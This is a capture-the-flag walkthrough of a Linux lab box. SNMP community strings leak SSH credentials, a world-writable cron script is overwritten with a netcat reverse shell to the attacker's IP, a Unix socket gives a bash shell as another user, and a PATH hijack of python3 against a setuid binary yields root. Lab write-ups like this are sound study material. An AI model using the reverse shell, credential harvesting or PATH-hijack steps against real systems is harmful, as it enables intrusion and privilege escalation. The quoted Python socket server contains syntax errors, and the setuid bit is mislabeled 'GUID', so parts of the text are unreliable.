# Overview

This was an interesting box starting with SNMP enumeration to find credentials for SSH. This then lead to some sort of cronjob running a script file from the users directory every minute which was writeable via parent directory permissions. From here the user scott was in the `banking` group and was able to interact with a `.sock` file which was essentially a shell for the user `ronnie`. Ronnie was then in the `bankers` group who could execute a binary called `bank_backupd` which had `GUID` leading to path hijacking and gaining root.

# Network Scan

```bash
# TCP

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:f4:1e:b2:b6:a0:5d:95:fd:c2:a7:d6:c3:fe:56:e0 (ECDSA)
|_  256 bc:39:b9:64:77:c9:d2:be:ed:f3:ac:8c:15:c1:6c:95 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

# UDP
PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
Service Info: Host: ip-10-1-244-89
```

# Unauthenticated Enumeration

## Enumerating SNMP

As there was only 1 TCP port open i switched to a UDP scan to identify that `SNMP` was open. From here i used `onesixtyone` to identify and community strings.

```bash
$ onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.1.244.89
Scanning 1 hosts, 120 communities
10.1.244.89 [public] Linux ip-10-1-244-89 6.14.0-1012-aws #12~24.04.1-Ubuntu SMP Fri Aug 15 00:16:05 UTC 2025 x86_64
10.1.244.89 [public] Linux ip-10-1-244-89 6.14.0-1012-aws #12~24.04.1-Ubuntu SMP Fri Aug 15 00:16:05 UTC 2025 x86_64
```

As seen above i found to `public` strings. So from here i will use `snmpwalk` to enumerate them.

Here i found credentials to gain a foothold on the box.

```bash
$ snmpwalk -v2c -c public 10.1.244.89 1.3.6.1.2.1.1
iso.3.6.1.2.1.1.1.0 = STRING: "Linux ip-10-1-244-89 6.14.0-1012-aws #12~24.04.1-Ubuntu SMP Fri Aug 15 00:16:05 UTC 2025 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (917096) 2:32:50.96
iso.3.6.1.2.1.1.4.0 = STRING: "\"Admin Layne.Stanley:5t6^jahTRjab'\""   # CREDS HERE
iso.3.6.1.2.1.1.5.0 = STRING: "ip-10-1-244-89"
iso.3.6.1.2.1.1.6.0 = STRING: "\"Indianapolis\""
iso.3.6.1.2.1.1.8.0 = Timeticks: (10) 0:00:00.10
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
```

`Layne.Stanley:5t6^jahTRjab`

This look a few attempts to identify the username was lowercase and the random `'` wasn't part of the password.

# Enumeration as `layne`

```bash
layne.stanley@ip-10-1-244-89:~$ ls -la
total 4892
drwxrwxrwx 6 layne.stanley layne.stanley    4096 Nov  4 00:35 .
drwxr-xr-x 6 root          root             4096 Sep 12  2025 ..
/...SNIP.../
drwx------ 2 layne.stanley layne.stanley    4096 Sep 12  2025 .ssh
-rw------- 1 layne.stanley layne.stanley     896 Sep 12  2025 .viminfo
-rwxrwxrwx 1 scott.weiland scott.weiland      49 Nov  4 00:15 bankSmarter_backup.sh
```

In the users home folder there was a script file owned by a user called `scott.weiland`. Running `pspy` revealed that this was running every minute.

```bash
$ timeout 60 ./pspy
pspy - version: 1.2.1 - Commit SHA: kali

/...SNIP.../

2026/11/04 01:13:10 CMD: UID=1002  PID=52548  | bash /home/layne.stanley/bankSmarter_backup.sh 
2026/11/04 01:13:10 CMD: UID=1002  PID=52547  | /bin/sh -c bash /home/layne.stanley/bankSmarter_backup.sh 
```

Because this file is in our users home folder and and we have full write access over the `parent` directory i can overwrite this file. i do this with a reverse shell.

```bash
layne.stanley@ip-10-1-244-89:~$ echo -e '#!/bin/bash\nbusybox nc 10.200.115.243 4444 -e sh' > bankSmarter_backup.sh
```

I then catch a shell as `scott`

```bash
$ nc -lvnp 4444                      
listening on [any] 4444 ...
connect to [10.200.115.243] from (UNKNOWN) [10.1.244.89] 42540
whoami
scott.weiland
```

# Enumeration as scott

Firstly i add a ssh key to the users authorized keys so i can login via `.ssh`.

Then looking at the users `.bash_history` file i see interaction with a `.sock` file. Looking deeper into it this file seems to be a shell for the user `ronnie`

```bash
$ socat stdio unix-connect:/opt/bank/sockets/live.sock

# OR 

$ nc -U /opt/bank/sockets/live.sock
```

Gains me a shell as `ronnie`. 

Here is the script that creates the `.sock` file.

```python
cat pty_server.py
#!/usr/bin/env python3

import os, pty, socket, select, pwd, grp


SOCKET = "/opt/bank/sockets/live.sock"
OWNER = "ronnie.stone"
GROUP = "bank-team"


# Ensure socket directory exists
os.makedirs(os.path.dirname(SOCKET), exist_ok=True)


# Remove old socket if exists
if os.path.exists(SOCKET):
    os.unlink(SOCKET)

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind(SOCKET)

# Set ownership to ronnie.stone:bank-team
owner_uid = pwd.getpwnam(OWNER).pw_uid
group_gid = grp.getgrnam(GROUP).gr_gid
os.chown(SOCKET, owner_uid, group_gid)
os.chmod(SOCKET, 0o770)  # read/write for owner & group


server.listen(5)
print(f"[+] Listening on {SOCKET}")

while True:
    client, _ = server.accept()
    pid, fd = pty.fork()
    if pid == 0:
        os.execv("/bin/bash", ["/bin/bash"])
    else:
        while True
            r, _, _ = select.select([fd, client], [], [])
            for src in r:
                try:
                    data = os.read(fd if src != client else src.fileno(), 1024)
                except OSError:
                    client.close()
                    break
                if not dat:
                    client.close()
                    break
                if src == client:
                    os.write(fd, data)
                else:
                    client.sendall(data)
```

# Enumeration as ronnie

I find `ronnie` is a member of the group `bankers` and searching for files related to that group reveals a binary called `bank_backupd`.

```bash
ronnie.stone@ip-10-1-244-89:/opt/bank$ find / -group bankers -type f 2>/dev/null
<opt/bank$ find / -group bankers -type f 2>/dev/null
/usr/local/bin/bank_backupd
```

Checking this binary out further reveals its owned by root and had `GUID` set.

```bash
ronnie.stone@ip-10-1-244-89:/opt/bank$ ls -la /usr/local/bin/bank_backupd
ls -la /usr/local/bin/bank_backupd
-rwsr-x--- 1 root bankers 16192 Sep 12  2025 /usr/local/bin/bank_backupd
```

Finally to gain a shell as root i run strings on the file to identify it runs `python3`. i then create a malicous `python3` file, modify the path and run the binary.

```bash
ronnie.stone@ip-10-1-244-89:/opt/bank$ echo -e '#!/bin/bash\nbash' > /tmp/python3    

ronnie.stone@ip-10-1-244-89:/opt/bank$ chmod 777 /tmp/python3

ronnie.stone@ip-10-1-244-89:/opt/bank$ export PATH=/tmp:$PATH

ronnie.stone@ip-10-1-244-89:/opt/bank$ /usr/local/bin/bank_backupd
[bank_backupd] Starting backup for BankSmarter accounts...
[bank_backupd] Connecting to central ledger...
[bank_backupd] Verifying transaction logs...

root@ip-10-1-244-89:/opt/bank#
```
